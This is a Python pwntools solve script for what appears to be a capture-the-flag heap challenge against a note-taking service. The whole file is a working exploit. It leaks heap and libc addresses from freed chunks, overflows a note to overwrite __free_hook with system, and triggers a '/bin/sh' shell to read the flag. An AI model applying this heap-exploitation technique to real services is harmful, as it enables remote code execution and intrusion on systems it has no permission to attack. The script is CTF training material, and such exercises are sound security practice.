import os

from pwn import *

# !!!! Parts of the solve script are a bit messy so the program sometimes pulls in more data than it should.
# !!!! If you don't get the shell, rerun the script a couple of times.

libc = ELF("./libc.so.6")

p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))
# p = process("./app")
# p = gdb.debug("./app", gdbscript="""
#     b * main
#     b * note_edit
#     b * note_add
#     b * note_delete
# """)

def note_add(title, content, contentlen=None):
    if contentlen is None:
        contentlen = len(content)
    p.sendlineafter(b"> ", b"1")
    p.sendline(title)
    p.sendline(str(contentlen).encode())
    p.sendline(content)

def note_print(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendline(str(idx).encode())

def note_edit(idx, title, content):
    p.sendlineafter(b"> ", b"3")
    p.sendline(str(idx).encode())
    p.sendline(title)
    p.sendline(content)

def note_sign(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendline(str(idx).encode())

def note_delete(idx):
    p.sendlineafter(b"> ", b"5")
    p.sendline(str(idx).encode())

note_add(b"AAAAAAAA", b"AAAAAAAA", 10000) # large chunk for heap and libc leak
note_add(b"BBBBBBBB", b"BBBBBBBB", 64) # additional chunk for leaking next ptr
note_add(b"CCCCCCCC", b"CCCCCCCC", 64) # additional chunk for overflowing into 
note_add(b"XXXXXXXX", b"/bin/sh\x00", 64) # no chunk consolidation
note_delete(2) # free to build up bins counter
note_delete(1) # free additional chunk to get some pointers on the heap
note_delete(0) # free large chunk to get heap and libc pointers
note_print(0) # leak the large chunk

leak = p.recvline().split(b"Title: ")[1].split(b"Note not signed")[0]
leak = leak.split(b"Content: ")
leak_heap = u64(leak[0].ljust(8, b"\x00")) # get heap address from the note struct chunk
leak_libc = u64(leak[1].ljust(8, b"\x00")) # get libc address from the large chunk
print("Heap leak:", hex(leak_heap))
print("Libc leak:", hex(leak_libc))

libc.address = leak_libc - 0x3ebca0
print("Free hook:", hex(libc.symbols["__free_hook"]))

payload  = p64(leak_libc) + p64(leak_libc)
payload += b"A" * 0x2708
payload += p64(0x60)
payload += p64(libc.symbols["__free_hook"])
payload += p64(leak_heap)
note_edit(0, p64(leak_heap), payload) # overflow note[1]

note_add(b"DDDDDDDD", b"DDDDDDDD", 64)
note_add(b"EEEEEEEE", p64(libc.symbols["system"]), 0x50) # malloc chunk with __free_hook and put system on it

note_delete(3) # delete note[3] to run /bin/sh

p.sendline(b"cat flag")
print(p.recvall(timeout=10).decode(errors="replace"))
